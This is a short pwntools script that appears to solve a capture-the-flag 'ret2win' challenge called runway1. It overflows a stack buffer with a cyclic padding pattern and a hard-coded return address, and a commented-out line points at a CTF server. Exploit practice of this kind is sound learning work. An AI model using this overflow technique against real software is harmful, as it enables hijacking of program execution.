from pwn import *
# ret2win
context.binary = ELF('./runway1')

# p = remote("challs.pwnoh.io", 13401)
p = process()

addr = p32(0x080491e6)
payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaa' + addr

p.sendline(payload)
log.info(p.clean())

p.interactive()
# pattern = cyclic(100)
# print(pattern)